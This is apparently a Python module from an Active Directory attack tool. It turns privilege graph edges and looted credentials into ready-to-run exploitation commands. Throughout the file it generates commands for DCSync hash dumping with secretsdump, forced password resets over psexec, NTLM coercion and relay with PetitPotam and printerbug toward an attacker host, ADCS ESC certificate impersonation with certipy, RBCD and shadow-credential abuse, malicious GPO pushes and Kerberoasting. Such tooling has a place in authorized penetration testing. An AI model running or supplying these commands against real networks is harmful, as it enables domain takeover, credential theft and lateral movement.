"""Command generation for exploitation paths."""

from __future__ import annotations

from dataclasses import dataclass

from engine.loot import LootManager


EDGE_TOOL_MAP: dict[str, str] = {
    "DCSync": "impacket-secretsdump",
    "GenericAll": "impacket-getST",
    "WriteDacl": "impacket-dacledit",
    "WriteOwner": "impacket-owneredit",
    "MemberOf": "powerview",
}


@dataclass
class NodeContext:
    """Minimal node context used for dynamic command formatting."""

    id: str
    name: str
    node_type: str
    spn: str = ""
    domain: str = ""


class CommandOracle:
    """Generate ready-to-run commands from edge context and available loot."""

    def __init__(self, loot_manager: LootManager) -> None:
        self.loot_manager = loot_manager

    def _infer_domain(self, source_node: NodeContext, target_node: NodeContext) -> str:
        for candidate in (source_node.domain, target_node.domain):
            if candidate:
                return candidate

        for candidate in (source_node.name, target_node.name):
            if "@" in candidate:
                return candidate.split("@", maxsplit=1)[1].upper()

        for candidate in (source_node.name, target_node.name):
            if "." in candidate:
                return ".".join(candidate.split(".")[1:]).upper()

        return "<DOMAIN>"

    def _infer_username(self, source_node: NodeContext) -> str:
        credential = self.loot_manager.get_credential(source_node.id) or self.loot_manager.get_credential(
            source_node.name,
        )
        if credential and credential.username:
            return credential.username

        if "@" in source_node.name:
            return source_node.name.split("@", maxsplit=1)[0]

        return source_node.name

    def _auth_flags(self, source_node: NodeContext) -> str:
        flags = self.loot_manager.build_auth_flags(source_node.id)
        if flags:
            return flags
        return self.loot_manager.build_auth_flags(source_node.name)

    def get_exploit_command(
        self,
        edge_type: str,
        source_node: dict[str, str],
        target_node: dict[str, str],
    ) -> str:
        """Return a command template populated with loot and node metadata."""
        source = NodeContext(
            id=str(source_node.get("id", "")),
            name=str(source_node.get("name", "SOURCE_USER")),
            node_type=str(source_node.get("type", "entity")),
            spn=str(source_node.get("spn", "")),
            domain=str(source_node.get("domain", "")),
        )
        target = NodeContext(
            id=str(target_node.get("id", "")),
            name=str(target_node.get("name", "TARGET")),
            node_type=str(target_node.get("type", "entity")),
            spn=str(target_node.get("spn", "")),
            domain=str(target_node.get("domain", "")),
        )

        domain = self._infer_domain(source, target)
        username = self._infer_username(source)
        auth_flags = self._auth_flags(source)
        auth_part = f" {auth_flags}" if auth_flags else ""

        normalized_edge = edge_type or "Unknown"

        if normalized_edge == "DCSync":
            target_dc = target.name or "<DC_HOST>"
            return (
                f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} "
                "-just-dc"
            )

        if normalized_edge in (
            "GetChanges",
            "GetChangesAll",
            "GetChangesInFilteredSet",
            "DS-Replication-Get-Changes",
            "DS-Replication-Get-Changes-All",
            "DS-Replication-Get-Changes-In-Filtered-Set",
        ):
            target_domain = target.name or "<TARGET_DOMAIN>"
            return (
                f"# {normalized_edge}: replication right detected on {target_domain}\n"
                "# DCSync requires BOTH GetChanges and GetChangesAll on the same domain object\n"
                "# Verify edge pair in graph, then execute DCSync:\n"
                f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC> -just-dc"
            )

        if normalized_edge == "Contains":
            return (
                "# Contains: parent container can influence child objects via inherited ACEs or linked GPOs\n"
                "# Abuse is contextual: inspect inbound control on the parent, then pivot into child object abuse\n"
                "# Suggested checks:\n"
                "powershell -c \"Get-DomainObjectAcl -Identity '<PARENT_OBJECT>' -ResolveGUIDs\"\n"
                "powershell -c \"Get-DomainOU -Identity '<PARENT_OU>' -Properties gplink\""
            )

        if normalized_edge == "CrossForestTrust":
            return (
                "# CrossForestTrust: trust relationship is not direct compromise by itself\n"
                "# Enumerate trust settings, SID filtering, and delegation before selecting abuse path\n"
                "powershell -c \"Get-DomainTrust -Identity '<SOURCE_DOMAIN>' -Domain '<SOURCE_DOMAIN>'\"\n"
                "netdom trust <SOURCE_DOMAIN> /domain:<TARGET_DOMAIN> /verify"
            )

        if normalized_edge == "DCFor":
            target_domain = target.name or "<TARGET_DOMAIN>"
            return (
                "# DCFor: source host is a Domain Controller for the target domain\n"
                "# If you have administrative access on this DC, domain compromise is typically one step away\n"
                f"impacket-secretsdump{auth_part} {domain}/{username}@<TARGET_DC_HOST> -just-dc\n"
                f"# Target domain: {target_domain}"
            )

        if normalized_edge == "GenericAll" and target.node_type == "computer":
            target_spn = target.spn or f"HOST/{target.name}"
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                f"# Step 1: Get service ticket (requires GenericAll on computer) \n"
                f"impacket-getST{auth_part} -spn {target_spn} {domain}/{username} "
                f"-impersonate Administrator\n"
                f"# Step 2: Use ticket for lateral movement (set KRB5CCNAME first)"
            )

        if normalized_edge == "WriteDacl":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-dacledit{auth_part} -action write -rights FullControl "
                f"-target '{target_object}' {domain}/{username}"
            )

        if normalized_edge == "WriteOwner":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
                f"{domain}/{username}"
            )

        if normalized_edge == "MemberOf":
            target_group = target.name or "<TARGET_GROUP>"
            return (
                f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
            )

        # ForcePasswordChange / CanForceChangePassword
        if normalized_edge in ("ForcePasswordChange", "CanForceChangePassword"):
            target_user = target.name or "<TARGET_USER>"
            # Extract username if it contains domain prefix
            if "\\" in target_user:
                target_user = target_user.split("\\", maxsplit=1)[1]
            elif "@" in target_user:
                target_user = target_user.split("@", maxsplit=1)[0]
            
            new_password = "<NEW_PASSWORD>"
            target_host = "<TARGET_HOST>"
            return (
                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                f"'net user {target_user} {new_password}'"
            )

        # CanAddMember / AddMember
        if normalized_edge in ("CanAddMember", "AddMember", "AddMembers"):
            target_group = target.name or "<TARGET_GROUP>"
            if "\\" in target_group:
                target_group = target_group.split("\\", maxsplit=1)[1]
            elif "@" in target_group:
                target_group = target_group.split("@", maxsplit=1)[0]
            
            member_to_add = "<MEMBER_TO_ADD>"
            target_host = "<TARGET_DOMAIN_CONTROLLER>"
            return (
                "# AddMember: add controlled principal into target group\n"
                f"powershell -c \"Add-DomainGroupMember -Identity '{target_group}' -Members '{member_to_add}'\"\n"
                "# or classic net.exe flow\n"
                f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                f"'net group \"{target_group}\" {member_to_add} /add /domain'"
            )

        # AddSelf
        if normalized_edge == "AddSelf":
            target_group = target.name or "<TARGET_GROUP>"
            self_member = source.name or "<SELF_PRINCIPAL>"
            return (
                "# AddSelf: add yourself to target group to inherit its privileges\n"
                f"powershell -c \"Add-DomainGroupMember -Identity '{target_group}' -Members '{self_member}'\"\n"
                "# Verify membership\n"
                f"powershell -c \"Get-DomainGroupMember -Identity '{target_group}'\""
            )

        # AdminTo
        if normalized_edge == "AdminTo":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# AdminTo: local admin rights on target host, use for remote execution/lateral movement\n"
                f"impacket-psexec{auth_part} {domain}/{username}@{target_host}\n"
                f"# Alternatives: impacket-wmiexec {domain}/{username}@{target_host} / impacket-smbexec"
            )

        # CanRDP
        if normalized_edge == "CanRDP":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# CanRDP: open interactive RDP session to target host\n"
                f"xfreerdp /u:{username} /d:{domain} /v:{target_host}\n"
                "# Pass-the-hash variant (requires Restricted Admin mode on target)\n"
                "xfreerdp /pth:<NTLM_HASH> /u:<USER> /d:<DOMAIN> /v:<TARGET_HOST>"
            )

        # ClaimSpecialIdentity
        if normalized_edge == "ClaimSpecialIdentity":
            return (
                "# ClaimSpecialIdentity: obtain token with special identity SID via matching auth pathway\n"
                "# Example routes:\n"
                "# - Key Trust / MFA Key Property via PKINIT (shadow credentials)\n"
                "# - NTLM Authentication SID via NTLM logon\n"
                "# - Schannel Authentication SID via certificate auth\n"
                "# Validate resulting token groups on target host (whoami /groups)"
            )

        # CoerceAndRelayNTLMToADCS
        if normalized_edge == "CoerceAndRelayNTLMToADCS":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# CoerceAndRelayNTLMToADCS: coerce NTLM auth and relay to ADCS web enrollment\n"
                "impacket-ntlmrelayx -t http://<ADCS_SERVER>/certsrv/ --adcs --template <TEMPLATE> -smb2support\n"
                "# Trigger coercion from target (example)\n"
                f"SpoolSample.exe {target_host} <ATTACKER_NETBIOS>@<PORT>/file.txt\n"
                "# Then use issued certificate for auth\n"
                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
            )

        if normalized_edge == "CoerceAndRelayNTLMToLDAP":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# CoerceAndRelayNTLMToLDAP: WebClient-based coercion relayed to LDAP on a DC without LDAP signing\n"
                "ntlmrelayx.py -t ldap://<DOMAIN_CONTROLLER_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
                "# Alternative follow-up: use --delegate-access for RBCD instead of shadow credentials\n"
                "# Trigger coercion from the target computer to your listener\n"
                f"petitpotam.py -d '{domain}' -u '{username}' -p '<PASSWORD>' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
                "# Authenticate with the generated certificate or continue with the RBCD chain"
            )

        if normalized_edge == "CoerceAndRelayNTLMToLDAPS":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# CoerceAndRelayNTLMToLDAPS: WebClient-based coercion relayed to LDAPS on a DC without channel binding\n"
                "ntlmrelayx.py -t ldaps://<DOMAIN_CONTROLLER_IP> --shadow-credentials --shadow-target '<TARGET_COMPUTER>$'\n"
                "# Alternative follow-up: use --delegate-access for RBCD instead of shadow credentials\n"
                "# Trigger coercion from the target computer to your listener\n"
                f"petitpotam.py -d '{domain}' -u '{username}' -p '<PASSWORD>' '<ATTACKER_NETBIOS>@<PORT>/file.txt' '{target_host}'\n"
                "# Authenticate with the generated certificate or continue with the RBCD chain"
            )

        if normalized_edge == "CoerceAndRelayNTLMToSMB":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# CoerceAndRelayNTLMToSMB: coerce a victim computer and relay its NTLM auth to SMB on a signing-disabled target\n"
                f"ntlmrelayx.py -t smb://{target_host} -smb2support\n"
                "# Trigger coercion from a machine that is admin on the target\n"
                "printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<VICTIM_COMPUTER_IP> <ATTACKER_IP>\n"
                "# If the relay succeeds, use the relayed shell or SMB session to execute commands on the target"
            )

        if normalized_edge == "CoerceToTGT":
            target_domain = target.name or target.id or "<TARGET_DOMAIN>"
            return (
                "# CoerceToTGT: abuse unconstrained delegation to capture a Tier Zero TGT, then DCSync\n"
                "# 1) On the unconstrained-delegation host, monitor for incoming TGTs\n"
                "Rubeus.exe request monitor /user:<TARGET_DC_DNS_NAME> /interval:5 /nowrap\n"
                "# 2) Coerce the DC or other Tier Zero principal to authenticate to the compromised host\n"
                "printerbug.py '<DOMAIN>/<USER>:<PASSWORD>'@<TARGET_DC_IP> <COMPROMISED_HOST_IP>\n"
                "# 3) Convert/inject the captured ticket and use it for replication\n"
                "ticketConverter.py ticket.kirbi ticket.ccache\n"
                "export KRB5CCNAME=$PWD/ticket.ccache\n"
                f"secretsdump.py -k -just-dc-user <DOMAIN/TARGETUSER> <TARGET_DC_DNS>\n"
                f"# Target domain: {target_domain}"
            )

        # AddAllowedToAct / AllowedToAct (RBCD write primitive)
        if normalized_edge in ("AddAllowedToAct", "AllowedToAct"):
            target_computer = target.name or "<TARGET_COMPUTER>"
            return (
                "# AllowedToAct / AddAllowedToAct: abuse resource-based constrained delegation (RBCD)\n"
                f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
                f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_computer}' "
                f"{domain}/{username}\n"
                "# Follow up with S4U to impersonate a user to the target service\n"
                "Rubeus.exe s4u /user:<CONTROLLED_COMPUTER$> /rc4:<RC4_HASH> "
                f"/impersonateuser:<TARGET_USER> /msdsspn:cifs/{target_computer} /ptt"
            )

        # AllowedToDelegate (classic constrained delegation)
        if normalized_edge == "AllowedToDelegate":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# AllowedToDelegate: constrained delegation abuse via S4U2self/S4U2proxy\n"
                "Rubeus.exe s4u /user:<DELEGATING_ACCOUNT> /rc4:<ACCOUNT_HASH> "
                f"/impersonateuser:<TARGET_USER> /msdsspn:\"HTTP/{target_host}\" "
                "/altservice:cifs /ptt\n"
                "# Ticket can provide admin-level access if impersonating privileged user"
            )

        # CanPSRemote
        if normalized_edge == "CanPSRemote":
            target_host = target.name or "<TARGET_COMPUTER>"
            return (
                "# CanPSRemote: open remote PowerShell session and execute commands\n"
                "$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force\n"
                f"$Cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', $SecPassword)\n"
                f"$session = New-PSSession -ComputerName {target_host} -Credential $Cred\n"
                "Invoke-Command -Session $session -ScriptBlock { whoami }\n"
                "Disconnect-PSSession -Session $session; Remove-PSSession -Session $session"
            )

        # AddKeyCredentialLink (Shadow Credentials)
        if normalized_edge == "AddKeyCredentialLink":
            target_principal = target.name or "<TARGET_PRINCIPAL>"
            return (
                "# AddKeyCredentialLink: shadow credentials via msDS-KeyCredentialLink\n"
                f"pywhisker -d {domain} -u {username}{auth_part} "
                f"--target '{target_principal}' --action add\n"
                "# Then request TGT as target with PKINIT\n"
                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
            )

        # AllExtendedRights
        if normalized_edge == "AllExtendedRights":
            if target.node_type == "user":
                # AllExtendedRights on user = reset password via net user
                target_user = target.name or "<TARGET_USER>"
                if "\\" in target_user:
                    target_user = target_user.split("\\", maxsplit=1)[1]
                elif "@" in target_user:
                    target_user = target_user.split("@", maxsplit=1)[0]
                
                new_password = "<NEW_PASSWORD>"
                target_host = "<TARGET_HOST>"
                return (
                    f"impacket-psexec{auth_part} {domain}/{username}@{target_host} "
                    f"'net user {target_user} {new_password}'"
                )

            if target.node_type == "computer":
                return (
                    "# AllExtendedRights on COMPUTER may allow reading LAPS credentials\n"
                    f"powershell -c \"Get-ADComputer '{target.name or '<TARGET_COMPUTER>'}' "
                    "-Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd\""
                )

            if target.node_type == "domain":
                target_dc = target.name or "<DC_HOST>"
                return (
                    "# AllExtendedRights on DOMAIN can include replication rights (DCSync)\n"
                    f"impacket-secretsdump{auth_part} {domain}/{username}@{target_dc} -just-dc"
                )

            if target.node_type == "certtemplate":
                target_template = target.name or "<TEMPLATE>"
                return (
                    "# AllExtendedRights on CertTemplate grants enrollment rights (if CA publish/issuance prereqs are met)\n"
                    f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                    f"-target <CA-SERVER> -template {target_template}"
                )

            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-dacledit{auth_part} -action write -rights AllExtendedRights "
                f"-principal '{username}' -target '{target_object}' {domain}/{username}"
            )

        # GenericWrite / CanGenericWrite
        if normalized_edge in ("GenericWrite", "CanGenericWrite"):
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            target_name_l = target_object.casefold()

            if target.node_type == "user":
                return (
                    f"# GenericWrite on USER: common abuses\n"
                    f"# 1) Targeted Kerberoast by writing SPN\n"
                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
                    f"set object '{target_object}' servicePrincipalName -v 'HTTP/{target_object}'\n"
                    f"impacket-GetUserSPNs -dc-ip <DC_IP> -request {domain}/{username}{auth_part}\n"
                    f"# 2) Shadow Credentials (msDS-KeyCredentialLink)\n"
                    f"pywhisker -d {domain} -u {username}{auth_part} "
                    f"--target '{target_object}' --action add"
                )

            if target.node_type == "group":
                return (
                    f"# GenericWrite on GROUP: add controlled principal to group\n"
                    f"net rpc group addmem '{target_object}' '<CONTROLLED_USER>' "
                    f"-U '{domain}/{username}%<PASSWORD_OR_HASH>' -S <DC_HOST>\n"
                    f"# or\n"
                    f"bloodyAD --host <DC_IP> -d {domain} -u {username}{auth_part} "
                    f"add groupMember '{target_object}' '<CONTROLLED_USER>'"
                )

            if target.node_type == "computer":
                return (
                    f"# GenericWrite on COMPUTER: common abuses\n"
                    f"# 1) Shadow Credentials via msDS-KeyCredentialLink\n"
                    f"pywhisker -d {domain} -u {username}{auth_part} "
                    f"--target '{target_object}' --action add\n"
                    f"# 2) RBCD path (set msDS-AllowedToActOnBehalfOfOtherIdentity)\n"
                    f"impacket-rbcd{auth_part} -dc-ip <DC_IP> -action write "
                    f"-delegate-from '<CONTROLLED_COMPUTER>$' -delegate-to '{target_object}' "
                    f"{domain}/{username}"
                )

            # Heuristic handling for object classes we do not explicitly model yet.
            if "cn=" in target_name_l and "policies" in target_name_l:
                return (
                    f"# GenericWrite on GPO: push malicious policy\n"
                    f"pygpoabuse -d {domain} -u {username}{auth_part} --gpo-id '<GPO_GUID>' "
                    f"--command '<PAYLOAD_COMMAND>'\n"
                    f"# Also consider SharpGPOAbuse on Windows"
                )

            if target_name_l.startswith("ou="):
                return (
                    f"# GenericWrite on OU: abuse gPLink to apply attacker-controlled GPO\n"
                    f"# Follow WriteGPLink abuse flow against this OU\n"
                    f"# Target OU: {target_object}"
                )

            if target.node_type == "domain" or target_name_l.startswith("dc="):
                return (
                    f"# GenericWrite on DOMAIN: abuse gPLink at domain root\n"
                    f"# Follow WriteGPLink abuse flow to impact many principals\n"
                    f"# Target domain object: {target_object}"
                )

            return (
                f"# GenericWrite on {target.node_type or 'object'}: writeable attributes depend on object class\n"
                f"# Target: {target_object}\n"
                f"# Enumerate writeable attrs and pick abuse path (SPN, msDS-KeyCredentialLink, group membership, gPLink, ADCS attrs)"
            )

        # Owns
        if normalized_edge == "Owns":
            target_object = target.name or target.id or "<TARGET_OBJECT>"
            return (
                f"impacket-owneredit{auth_part} -action write -target '{target_object}' "
                f"{domain}/{username}\n"
                f"# Owner has full control; consider next steps like DACL modification or password reset"
            )

        # ADCS ESC1
        if normalized_edge == "ADCSESC1":
            return (
                "# ADCS ESC1: enroll auth-capable cert with arbitrary SAN/UPN\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                f"-target <CA-SERVER> -template <VULN_TEMPLATE> -upn <TARGET_USER>@{domain}\n"
                "# Use issued certificate to authenticate as target\n"
                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC3
        if normalized_edge == "ADCSESC3":
            return (
                "# ADCS ESC3: abuse Enrollment Agent to request cert on behalf of another principal\n"
                "# 1) Enroll Enrollment Agent cert\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <ENROLLMENT_AGENT_TEMPLATE>\n"
                "# 2) Request on-behalf-of cert for target principal\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <AUTH_TEMPLATE> -on-behalf-of <TARGET_USER> "
                "-pfx <AGENT_CERT>.pfx\n"
                "# 3) Authenticate as target\n"
                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC4
        if normalized_edge == "ADCSESC4":
            return (
                "# ADCS ESC4: modify CertTemplate ACL/settings to make it ESC1-abusable, then abuse ESC1\n"
                "# Grant template control (if needed)\n"
                "impacket-dacledit -action write -rights FullControl -principal <ATTACKER> "
                "-target-dn '<CERT_TEMPLATE_DN>' <DOMAIN>/<USER>:<PASS>\n"
                "# Reconfigure template (Linux certipy shortcut)\n"
                f"certipy template -username {username}@{domain} -password <PASSWORD> "
                "-template <TEMPLATE_CN> -save-old\n"
                "# Then execute ESC1 using the now-vulnerable template\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <TEMPLATE_CN> -upn <TARGET_USER>@<DOMAIN>\n"
                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC6a
        if normalized_edge in ("ADCSESC6a", "ADCSESC6A"):
            return (
                "# ADCS ESC6a: CA EDITF_ATTRIBUTESUBJECTALTNAME2 allows arbitrary SAN impersonation\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                "# If strong mapping is enforced, include SID URL (commonly via Certify on Windows)\n"
                "# Certify.exe request --ca <CA> --template <TEMPLATE> --upn <TARGET> --sid-url <TARGET_SID>\n"
                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC6b
        if normalized_edge in ("ADCSESC6b", "ADCSESC6B"):
            return (
                "# ADCS ESC6b: CA allows arbitrary SAN and target DC allows weak mapping\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <PUBLISHED_TEMPLATE> -upn <TARGET_USER>@<DOMAIN>\n"
                "# Authenticate as target with weak cert mapping on affected DC\n"
                "certipy auth -pfx <TARGET_USER>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC9a
        if normalized_edge in ("ADCSESC9a", "ADCSESC9A"):
            victim = source.name or "<VICTIM_PRINCIPAL>"
            return (
                "# ADCS ESC9a: weak mapping + no security extension + controlled victim UPN\n"
                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
                f"-user {victim} -upn <TARGET_SAMACCOUNTNAME>\n"
                "# Enroll cert as victim\n"
                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                "# Restore victim UPN and authenticate as target on weak-mapping DC\n"
                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
                f"-user {victim} -upn <ORIGINAL_UPN>\n"
                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC9b
        if normalized_edge in ("ADCSESC9b", "ADCSESC9B"):
            victim = source.name or "<VICTIM_COMPUTER>$"
            return (
                "# ADCS ESC9b: weak mapping + no security extension + controlled victim dNSHostName\n"
                "# 1) Remove conflicting SPNs for victim if needed\n"
                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
                f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                "# 2) Enroll cert as victim computer\n"
                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                "# 3) (Optional) restore victim dNSHostName/SPN, then authenticate as target computer\n"
                "certipy auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP>"
            )

        # ADCS ESC10a
        if normalized_edge == "ADCSESC10a":
            victim = source.name or "<VICTIM_PRINCIPAL>"
            return (
                "# ADCS ESC10a: UPN mapping abuse via controlled victim principal\n"
                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
                f"-user {victim} -upn <TARGET_SAM>@{domain}\n"
                "# Enroll certificate as victim on affected template/CA\n"
                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                "# Restore victim UPN and authenticate with issued cert\n"
                f"certipy account update -u {username}@{domain} -p <PASSWORD> -user {victim} -upn <ORIGINAL_UPN>\n"
                "certipy auth -pfx <TARGET>.pfx -dc-ip <DC_IP> -ldap-shell"
            )

        # ADCS ESC10b
        if normalized_edge == "ADCSESC10b":
            victim = source.name or "<VICTIM_COMPUTER>$"
            return (
                "# ADCS ESC10b: dNSHostName mapping abuse via controlled computer\n"
                "# 1) Remove conflicting SPNs on victim if needed\n"
                "# 2) Set victim dNSHostName to target computer FQDN\n"
                f"certipy account update -u {username}@{domain} -p <PASSWORD> "
                f"-user {victim} -dns <TARGET_HOST>.{domain}\n"
                "# 3) Enroll cert as victim computer\n"
                f"certipy req -u {victim} -p <VICTIM_PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <VULN_TEMPLATE>\n"
                "# 4) Authenticate as mapped target computer\n"
                "certipy auth -pfx <TARGET_HOST>.pfx -dc-ip <DC_IP> -ldap-shell"
            )

        # ADCS ESC13
        if normalized_edge == "ADCSESC13":
            return (
                "# ADCS ESC13: enroll via template with issuance policy OID->group link\n"
                f"certipy req -u {username}@{domain} -p <PASSWORD> -ca <CA-NAME> "
                "-target <CA-SERVER> -template <ESC13_TEMPLATE>\n"
                "# Use issued certificate to obtain TGT / authenticate with group-derived privileges\n"
                "certipy auth -pfx <USER>.pfx -dc-ip <DC_IP>"
            )

        tool = EDGE_TOOL_MAP.get(normalized_edge, "manual")
        return (
            f"# Edge type '{normalized_edge}' requires manual enumeration or custom approach\n"
            f"# Source: {source.name} ({source.node_type}) -> Target: {target.name} ({target.node_type})\n"
            f"# Suggested tool to investigate: {tool}\n"
            f"# Try using impacket-psexec, impacket-wmiexec, or impacket-smbexec for execution"
        )

    def get_kerberoast_command(self, target_node: dict[str, str]) -> str:
        """Return an impacket-GetUserSPNs command for a kerberoastable target node."""
        target = NodeContext(
            id=str(target_node.get("id", "")),
            name=str(target_node.get("name", "TARGET_USER")),
            node_type=str(target_node.get("type", "user")),
            spn=str(target_node.get("spn", "")),
            domain=str(target_node.get("domain", "")),
        )
        domain = self._infer_domain(target, target)

        # Use any available credential from loot as the attacker context.
        attacker_user = "<attacker_user>"
        auth_part = ""
        all_creds = self.loot_manager.all_credentials()
        if all_creds:
            first_cred = all_creds[0]
            attacker_principal = first_cred.get("principal", "")
            flags = self.loot_manager.build_auth_flags(attacker_principal)
            if flags:
                auth_part = f" {flags}"
                raw_user = (
                    first_cred.get("username", "")
                    or attacker_principal.split("\\")[-1]
                )
                attacker_user = raw_user or attacker_user

        target_sam = target.name.split("@")[0] if "@" in target.name else target.name
        return (
            f"impacket-GetUserSPNs{auth_part} {domain}/{attacker_user} "
            f"-request-user {target_sam} -outputfile kerberoast.hashes"
        )
